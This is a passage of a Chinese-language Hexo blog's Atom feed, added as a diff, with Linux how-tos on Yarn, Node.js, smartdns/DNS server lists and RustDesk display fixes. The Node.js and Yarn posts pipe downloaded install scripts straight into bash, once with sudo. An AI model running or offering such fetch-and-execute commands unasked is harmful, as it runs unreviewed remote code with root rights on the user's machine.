@@ -1,0 +1,722 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>赛博空间</title>
+  <icon>https://macin.top/img/ast.webp</icon>
+  <subtitle>Cyber</subtitle>
+  <link href="https://macin.top/atom.xml" rel="self"/>
+  
+  <link href="https://macin.top/"/>
+  <updated>2024-12-24T12:40:19.190Z</updated>
+  <id>https://macin.top/</id>
+  
+  <author>
+    <name>马斯克</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>在linux安装yarn环境</title>
+    <link href="https://macin.top/posts/be05e3cb/"/>
+    <id>https://macin.top/posts/be05e3cb/</id>
+    <published>2024-12-24T12:19:59.000Z</published>
+    <updated>2024-12-24T12:40:19.190Z</updated>
+    
+    <content type="html"><![CDATA[<p>总结 在 Ubuntu 上安装 Yarn 环境可以通过以下步骤完成：</p><p>步骤 1: 更新系统 首先，确保你的系统是最新的。打开终端并运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt upgrade</span><br></pre></td></tr></table></figure><p>步骤 2: 安装 Node.js Yarn 依赖于 Node.js，因此需要先安装 Node.js。你可以使用 NodeSource 的 PPA 来安装最新版本的 Node.js。运行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sL &lt;https://deb.nodesource.com/setup_16.x&gt; | sudo -E bash -</span><br><span class="line">sudo apt install -y nodejs</span><br></pre></td></tr></table></figure><p>你可以根据需要替换 16.x 为其他版本（如 14.x 或 18.x）。</p><p>步骤 3: 安装 Yarn 有几种方法可以安装 Yarn，最常用的是通过 npm 或直接使用 APT。</p><p>方法 1: 使用 npm 安装 如果你已经安装了 Node.js 和 npm，可以直接使用 npm 安装 Yarn：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --global yarn</span><br></pre></td></tr></table></figure><p>方法 2: 使用 APT 安装 首先，添加 Yarn 的 APT 仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sS &lt;https://dl.yarnpkg.com/debian/pubkey.gpg&gt; | sudo apt-key add -</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb &lt;https://dl.yarnpkg.com/debian/&gt; stable main&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/yarn.list</span><br></pre></td></tr></table></figure><p>更新 APT 包索引并安装 Yarn：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install yarn</span><br></pre></td></tr></table></figure><p>步骤 4: 验证安装 安装完成后，可以通过以下命令验证 Yarn 是否成功安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn --version</span><br></pre></td></tr></table></figure><p>如果显示版本号，则表示 Yarn 已成功安装。</p><p>总结 确保 Node.js 和 npm 已正确安装，以便 Yarn 能够正常工作。</p>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>smartdns对接passwall解决dns泄露，国内外DNS汇总</title>
+    <link href="https://macin.top/posts/60aba363/"/>
+    <id>https://macin.top/posts/60aba363/</id>
+    <published>2024-12-24T12:03:27.000Z</published>
+    <updated>2024-12-24T12:40:19.187Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="iStore软件包-iStore-run-Packages"><a href="#iStore软件包-iStore-run-Packages" class="headerlink" title="iStore软件包 iStore .run Packages"></a>iStore软件包 iStore .run Packages</h1><p>下载run安装包——iStore——手动安装——选择run安装包即可自动安装</p><p><a href="https://github.com/AUK9527/Are-u-ok/blob/main/apps/README.md">https://github.com/AUK9527/Are-u-ok/blob/main/apps/README.md</a></p><p><img src="/img/smartdns/1.webp" alt="1"></p><p><img src="/img/smartdns/2.webp"></p><p><img src="/img/smartdns/3.webp"></p><h1 id="国内外DNS汇总"><a href="#国内外DNS汇总" class="headerlink" title="国内外DNS汇总"></a>国内外DNS汇总</h1><p>UDP传输时间短，加密统一选择：https</p><p>DNS查询：<a href="https://dns.ip.cn/">https://dns.ip.cn/</a></p><h2 id="国内DNS"><a href="#国内DNS" class="headerlink" title="国内DNS:"></a>国内DNS:</h2><p><strong>阿里公共DNS：</strong></p><p>223.5.5.5  类型选择：UDP</p><p>223.6.6.6  类型选择：UDP</p><p>阿里加密DNS：alidns_ip&#x2F;dns-query  类型选择：https</p><p>阿里加密DNS：<a href="http://dns.alidns.com/dns-query">dns.alidns.com&#x2F;dns-query</a>  类型选择：https</p><p>DoT 地址: <a href="http://dns.alidns.com/">dns.alidns.com</a></p><p>DoH 地址: <a href="https://dns.alidns.com/dns-query">https://dns.alidns.com/dns-query</a></p><p><strong>腾讯公共DNS:</strong></p><p>DNS：119.29.29.29 类型选择：UDP</p><p>腾讯加密DNS：doh.pub&#x2F;dns-query  类型选择：https</p><p>腾讯加密DNS：sm2.doh.pub&#x2F;dns-query 类型选择：https</p><p>DoT 地址: dot.pub</p><p>DoH 地址: <a href="https://doh.pub/dns-query">https://doh.pub/dns-query</a></p><p>DoH (国密 SM2,基于腾讯云政企国密解决方案) 地址:<a href="https://sm2.doh.pub/dns-query">https://sm2.doh.pub/dns-query</a></p><p><strong>360公共DNS</strong></p><p>中国电信&#x2F;铁通&#x2F;移动： 101.226.4.6  218.30.118.6  类型选择：UDP</p><p>中国联通： 123.125.81.6   140.207.198.6  类型选择：UDP</p><p><strong>百度公共DNS：</strong>180.76.76.76 类型选择：UDP</p><p><strong>114DNS：</strong>114.114.114.114  114.114.115.115  类型选择：UDP</p><h2 id="国外DNS："><a href="#国外DNS：" class="headerlink" title="国外DNS："></a>国外DNS：</h2><p><strong>CloudflareDNS：</strong>1.1.1.1  类型选择：UDP</p><p>Cloudflare加密DNS：1.1.1.1&#x2F;dns-query  类型选择：tls</p><p>DoT 地址: <a href="http://cloudflare-dns.com/">cloudflare-dns.com</a></p><p>DoH 地址: <a href="https://1dot1dot1dot1.cloudflare-dns.com/">https://1dot1dot1dot1.cloudflare-dns.com/</a></p><p><strong>Google DNS：</strong></p><p>8.8.8.8   8.8.4.4  类型选择：UDP</p><p>谷歌加密DNS：<a href="https://dns.google/dns-query">https://dns.google/dns-query</a>  类型选择：https</p><p>谷歌加密DNS：dns.google  类型选择：tls</p><p><strong>Norton ConnectSafe：</strong> 199.85.126.10  199.85.127.10 类型选择：UDP</p><p><strong>威瑞信：</strong>64.6.64.6  64.6.65.6 类型选择：UDP</p><p><strong>Comodo安全DNS：</strong> 8.26.56.2  68.20.247.20 类型选择：UDP</p><p><strong>DNS Watch：</strong> 84.200.69.80  84.200.70.40 类型选择：UDP</p><p><strong>Quad9：</strong></p><p>Quda9加密DNS：<a href="http://dns11.quad9.net/dns-query">dns11.quad9.net&#x2F;dns-query</a></p><p>DoT 地址: <a href="http://dns.quad9.net/">dns.quad9.net</a></p><p>DoH 地址: <a href="https://dns.quad9.net/dns-query">https://dns.quad9.net/dns-query</a></p><p><strong>协议类型知识点:</strong></p><p>协议类型解析：UDP:53  tcp:53  tls:853  https:443</p><p>相关网址：</p><p><a href="https://www.cccitu.com/2205354.html">https://www.cccitu.com/2205354.html</a></p><p><a href="https://dns.icoa.cn/dot-doh/">https://dns.icoa.cn/dot-doh/</a></p><p><a href="https://cloud.tencent.com/developer/article/1924976?from=15425">https://cloud.tencent.com/developer/article/1924976?from=15425</a></p><p><a href="https://www.techug.com/post/free-dns-server-ip-list/">https://www.techug.com/post/free-dns-server-ip-list/</a></p><h1 id="查看端口是否被smartdns监听"><a href="#查看端口是否被smartdns监听" class="headerlink" title="查看端口是否被smartdns监听"></a>查看端口是否被smartdns监听</h1><p>1、功能解析：</p><ul><li>域名TTL：DNS服务器中域名解析记录的保留时间，单位为秒</li></ul><p>2、查询DNS记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup 域名</span><br></pre></td></tr></table></figure><ul><li>windows下查询</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup smartdns. 域名</span><br></pre></td></tr></table></figure><p>3、查询是否开启TCP&#x2F;UDP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tlpn |grep 7053</span><br></pre></td></tr></table></figure><ul><li>tlpn解析：-t 选项用于显示 TCP 连接，-l 选项用于显示监听状态的连接，-n 选项用于显示 IP 地址和端口号，-p 选项用于显示与连接关联的进程信息。</li></ul>]]></content>
+    
+    
+    <summary type="html">openwrt,os</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="openwrt" scheme="https://macin.top/categories/os/openwrt/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="openwrt" scheme="https://macin.top/tags/openwrt/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>如何在ubuntu安装node.js</title>
+    <link href="https://macin.top/posts/24b5158a/"/>
+    <id>https://macin.top/posts/24b5158a/</id>
+    <published>2024-12-23T12:22:33.000Z</published>
+    <updated>2024-12-24T12:40:19.191Z</updated>
+    
+    <content type="html"><![CDATA[<p>Node.js是一个广受欢迎的JavaScript运行时环境，在Ubuntu系统上安装Node.js有多种方法。本文将介绍三种常用的安装方式，帮助您在Ubuntu18.04上成功部署Node.js环境。</p><h3 id="方法1：使用apt包管理器安装Node-js"><a href="#方法1：使用apt包管理器安装Node-js" class="headerlink" title="方法1：使用apt包管理器安装Node.js"></a><strong>方法1：使用apt包管理器安装Node.js</strong></h3><p>使用Ubuntu的默认包管理器apt是安装Node.js最简单的方法：</p><ol><li>更新包列表：<code>sudo apt update</code></li><li>安装Node.js：<code>sudo apt install nodejs</code></li><li>安装npm（Node包管理器）：<code>sudo apt install npm</code></li><li>验证安装：<code>nodejs -v</code> 和 <code>npm -v</code></li></ol><h3 id="方法2：使用NVM（Node-Version-Manager）安装"><a href="#方法2：使用NVM（Node-Version-Manager）安装" class="headerlink" title="方法2：使用NVM（Node Version Manager）安装"></a><strong>方法2：使用NVM（Node Version Manager）安装</strong></h3><p>NVM允许您安装和管理多个Node.js版本：</p><ol><li>下载NVM安装脚本：<code>curl -o- &lt;https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh&gt; | bash</code></li><li>重新加载终端配置：<code>source ~/.bashrc</code></li><li>安装最新版Node.js：<code>nvm install node</code></li><li>验证安装：<code>node -v</code> 和 <code>npm -v</code></li></ol><h3 id="方法3：使用官方二进制包安装"><a href="#方法3：使用官方二进制包安装" class="headerlink" title="方法3：使用官方二进制包安装"></a><strong>方法3：使用官方二进制包安装</strong></h3><p>从Node.js官网下载并安装二进制包：</p><ol><li>下载最新的Node.js二进制包</li><li>解压文件：<code>tar xf node-v*.tar.xz</code></li><li>将解压后的文件夹移动到 &#x2F;usr&#x2F;local 目录：<code>sudo mv node-v*-linux-x64 /usr/local/node</code></li><li>配置环境变量，编辑 ~&#x2F;.bashrc 文件，添加：<code>export PATH=/usr/local/node/bin:$PATH</code></li><li>重新加载配置：<code>source ~/.bashrc</code></li><li>验证安装：<code>node -v</code> 和 <code>npm -v</code></li></ol><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h3><p>通过以上三种方法，您可以根据自己的需求选择合适的Node.js安装方式。无论选择哪种方法，成功安装后都可以开始在Ubuntu系统上进行Node.js开发了。记得定期更新Node.js以获取最新的功能和安全补丁。</p>]]></content>
+    
+    
+    <summary type="html">ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>rustdesk连接ubuntu登录界面不支持wayland解决方法</title>
+    <link href="https://macin.top/posts/b3db3a56/"/>
+    <id>https://macin.top/posts/b3db3a56/</id>
+    <published>2024-12-23T12:13:02.000Z</published>
+    <updated>2024-12-24T12:40:19.187Z</updated>
+    
+    <content type="html"><![CDATA[<p>RustDesk 自 1.2.0 版本起开始实验性地支持 Wayland。</p><h3 id="显示服务器"><a href="#显示服务器" class="headerlink" title="显示服务器"></a>显示服务器</h3><p><a href="https://askubuntu.com/questions/1260142/ubuntu-set-default-login-desktop">Ubuntu</a> | <a href="https://docs.fedoraproject.org/en-US/quick-docs/configuring-xorg-as-default-gnome-session/">Fedora</a> | <a href="https://bbs.archlinux.org/viewtopic.php?id=218319">Arch Linux</a></p><h3 id="登录屏幕"><a href="#登录屏幕" class="headerlink" title="登录屏幕"></a>登录屏幕</h3><p>目前尚不支持使用 Wayland 的登录屏幕。如果您想在 RustDesk 重启或注销后访问登录屏幕，则需要将登录屏幕更改为 X11，请在<code>/etc/gdm/custom.conf</code>或<code>/etc/gdm3/custom.conf</code>中将以下行修改为<code>WaylandEnable=false</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WaylandEnable=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>请重新启动以使上述更改生效。</p>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux如何查找文件和目录</title>
+    <link href="https://macin.top/posts/85cde2ad/"/>
+    <id>https://macin.top/posts/85cde2ad/</id>
+    <published>2024-12-22T13:45:30.000Z</published>
+    <updated>2024-12-24T12:40:19.185Z</updated>
+    
+    <content type="html"><![CDATA[<p>在Ubuntu中，可以使用以下命令来查找文件和目录：</p><p>使用 <code>find</code> 命令来查找文件和目录，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /path/to/search -name <span class="string">&quot;filename&quot;</span></span><br></pre></td></tr></table></figure><p>例如，要在根目录下查找名为 <code>test.txt</code> 的文件，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&quot;test.txt&quot;</span></span><br></pre></td></tr></table></figure><p>使用 <code>locate</code> 命令来快速查找文件和目录，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate filename</span><br></pre></td></tr></table></figure><p>要更新 <code>locate</code> 命令的数据库，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure><p>使用 <code>ls</code> 命令来查看当前目录下的文件和目录，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>要查看隐藏文件和目录，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure><p>使用 <code>grep</code> 命令来搜索文件内容，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;keyword&quot;</span> filename</span><br></pre></td></tr></table></figure><p>例如，要在 <code>test.txt</code> 文件中搜索关键词 <code>example</code>，可以使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;example&quot;</span> test.txt</span><br></pre></td></tr></table></figure><p>以上是在Ubuntu中查找文件和目录的几种常用方法，可以根据具体需求选择合适的方法。</p>]]></content>
+    
+    
+    <summary type="html">centos,ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="centos" scheme="https://macin.top/categories/os/centos/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="centos" scheme="https://macin.top/tags/centos/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ubuntu卸载与安装软件命令总结</title>
+    <link href="https://macin.top/posts/2d94cf8f/"/>
+    <id>https://macin.top/posts/2d94cf8f/</id>
+    <published>2024-12-22T11:56:10.000Z</published>
+    <updated>2024-12-24T12:40:19.188Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="安装软件的方法"><a href="#安装软件的方法" class="headerlink" title="安装软件的方法"></a>安装软件的方法</h3><h4 id="1-使用dpkg命令"><a href="#1-使用dpkg命令" class="headerlink" title="1. 使用dpkg命令"></a>1. 使用dpkg命令</h4><p><code>dpkg</code>是Debian包管理工具，用于安装、构建、删除和管理Debian软件包，但不自动处理依赖关系。</p><ul><li><p>打开终端。</p></li><li><p>转到<code>.deb</code>文件所在的目录。</p></li><li><p>运行以下命令来安装包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i package_name.deb</span><br></pre></td></tr></table></figure></li><li><p>如果安装中出现缺少依赖的错误，可以通过运行以下命令来安装它们：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -f</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-使用APT命令"><a href="#2-使用APT命令" class="headerlink" title="2. 使用APT命令"></a>2. 使用APT命令</h4><p>从APT 1.1版本开始，<code>apt</code>直接支持安装本地的<code>.deb</code>文件，同时自动处理依赖问题。</p><ul><li><p>打开终端。</p></li><li><p>使用apt命令安装.deb文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install ./package_name.deb</span><br></pre></td></tr></table></figure><p>确保在文件名前加上<code>./</code>，这表明该文件位于当前目录。</p></li></ul><p>这些是在Linux上安装<code>.deb</code>包的几种常用方法，你可以根据自己的需求和环境选择最合适的方法。</p><h3 id="卸载软件的方法"><a href="#卸载软件的方法" class="headerlink" title="卸载软件的方法"></a>卸载软件的方法</h3><p><strong>在Ubuntu上卸载软件</strong>可以通过几种不同的方法进行，具体取决于你的偏好和你如何安装这个软件。这里介绍几种常用的方法：</p><h4 id="1-使用APT命令卸载软件"><a href="#1-使用APT命令卸载软件" class="headerlink" title="1. 使用APT命令卸载软件"></a>1. 使用APT命令卸载软件</h4><p>如果你是通过APT（Ubuntu的包管理工具）安装的软件，你可以使用以下命令来卸载它：</p><ul><li><p>打开终端。</p></li><li><p>运行以下命令以卸载软件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt remove package_name</span><br></pre></td></tr></table></figure><p>这个命令将卸载软件，但通常会保留配置文件。</p><p>如果你不确定软件的具体包名，可以使用<strong>apt list –installed</strong>命令来查看所有已安装的软件包名。可以用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt list --install | grep &lt;软件关键词&gt;</span><br></pre></td></tr></table></figure><p>来快速查找定位相关软件包；</p></li><li><p>如果你想彻底删除软件包并清除其配置文件，可以使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt purge package_name</span><br></pre></td></tr></table></figure></li><li><p>要清理系统中不再需要的依赖包，可以执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt autoremove</span><br></pre></td></tr></table></figure></li></ul><h4 id="2-使用图形界面工具（如Ubuntu-Software-Center）"><a href="#2-使用图形界面工具（如Ubuntu-Software-Center）" class="headerlink" title="2. 使用图形界面工具（如Ubuntu Software Center）"></a>2. 使用图形界面工具（如Ubuntu Software Center）</h4><p>可以通过Ubuntu自带的软件中心进行软件的卸载：</p><ul><li>打开“Ubuntu Software Center”。</li><li>点击“已安装”标签页。</li><li>搜索或找到你想要卸载的软件。</li><li>点击该软件条目，然后点击“卸载”。</li></ul><hr><p>常用Ubuntu命令</p><table><thead><tr><th align="center">操作</th><th align="center">命令</th></tr></thead><tbody><tr><td align="center">解压缩</td><td align="center">tar -zxvf &lt;softwarename.tar.gz&gt;</td></tr></tbody></table><h3 id="查看软件安装目录"><a href="#查看软件安装目录" class="headerlink" title="查看软件安装目录"></a>查看软件安装目录</h3><h4 id="1-whereis-命令："><a href="#1-whereis-命令：" class="headerlink" title="1. whereis 命令："></a>1. <strong>whereis 命令</strong>：</h4><p><code>whereis</code> 命令可以用来查找二进制文件、源代码文件和手册页的路径。这个命令对于快速查找程序的二进制执行文件、源代码和手册页非常有用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis 程序名称</span><br></pre></td></tr></table></figure><p>比如，要查找 <code>vim</code> 的相关文件，可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis vim</span><br></pre></td></tr></table></figure><h4 id="2-which-命令："><a href="#2-which-命令：" class="headerlink" title="2. which 命令："></a>2. <strong>which 命令</strong>：</h4><p><code>which</code> 命令通常用来查找某个特定命令的执行文件（二进制文件）的完整路径，这个命令<strong>只返回可执行文件的路径</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> 程序名称</span><br></pre></td></tr></table></figure><p>例如，查找 <code>vim</code> 的二进制文件位置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> vim</span><br></pre></td></tr></table></figure><p>这两个命令对于快速确定程序的位置很有帮助，特别是当你知道程序名但不确定它的安装细节时。</p>]]></content>
+    
+    
+    <summary type="html">ubuntu,os,debian,kali</summary>
+    
+    
+    
+    <category term="os" scheme="https://macin.top/categories/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/categories/os/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/categories/os/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/categories/os/kali/"/>
+    
+    
+    <category term="os" scheme="https://macin.top/tags/os/"/>
+    
+    <category term="ubuntu" scheme="https://macin.top/tags/ubuntu/"/>
+    
+    <category term="debian" scheme="https://macin.top/tags/debian/"/>
+    
+    <category term="kali" scheme="https://macin.top/tags/kali/"/>
+    
+    <category term="linux" scheme="https://macin.top/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>windows连接ubuntu黑屏,使用rustdesk显示no displays没有显示器</title>
+    <link href="https://macin.top/posts/7d17509c/"/>
+    <id>https://macin.top/posts/7d17509c/</id>
+    <published>2024-12-22T11:36:11.000Z</published>
+    <updated>2024-12-24T12:40:19.189Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="解决办法安装虚拟显示器"><a href="#解决办法安装虚拟显示器" class="headerlink" title="解决办法安装虚拟显示器"></a>解决办法安装虚拟显示器</h3><h3 id="安装xorg虚拟显示器"><a href="#安装xorg虚拟显示器" class="headerlink" title="安装xorg虚拟显示器"></a>安装xorg虚拟显示器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install xserver-xorg-video-dummy</span><br><span class="line"><span class="comment"># 提示错误依赖使用下面这个试试</span></span><br><span class="line">apt install xserver-xorg-video-dummy  --fix-missing</span><br></pre></td></tr></table></figure><h3 id="配置虚拟显示器"><a href="#配置虚拟显示器" class="headerlink" title="配置虚拟显示器"></a>配置虚拟显示器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/X11/xorg.conf</span><br><span class="line"><span class="comment"># 内容如下:</span></span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Device&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Configured Video Device&quot;</span></span><br><span class="line">    Driver      <span class="string">&quot;dummy&quot;</span></span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Monitor&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Configured Monitor&quot;</span></span><br><span class="line">    HorizSync 31.5-48.5</span><br><span class="line">    VertRefresh 50-70</span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line">Section <span class="string">&quot;Screen&quot;</span></span><br><span class="line">    Identifier  <span class="string">&quot;Default Screen&quot;</span></span><br><span class="line">    Monitor     <span class="string">&quot;Configured Monitor&quot;</span></span><br><span class="line">    Device      <span class="string">&quot;Configured Video Device&quot;</span></span><br><span class="line">    DefaultDepth 24</span><br><span class="line">    SubSection <span class="string">&quot;Display&quot;</span></span><br><span class="line">        Depth 24</span><br><span class="line">        Modes <span class="string">&quot;1920x1080&quot;</span></span><br><span class="line">    EndSubSection</span><br><span class="line">EndSection</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容结束</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同样也填入以上内容到以下文件 </span></span><br><span class="line">vim /usr/share/doc/xserver-xorg-video-intel/xorg.conf</span><br></pre></td></tr></table></figure><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><h3 id="连接远程不再提示-没有显示器或黑屏-但是正常插入显示器-不能正常显示"><a href="#连接远程不再提示-没有显示器或黑屏-但是正常插入显示器-不能正常显示" class="headerlink" title="连接远程不再提示 没有显示器或黑屏 但是正常插入显示器 不能正常显示"></a>连接远程不再提示 没有显示器或黑屏 但是正常插入显示器 不能正常显示</h3><h5 id="解决办法-移除刚才的连个配置文件"><a href="#解决办法-移除刚才的连个配置文件" class="headerlink" 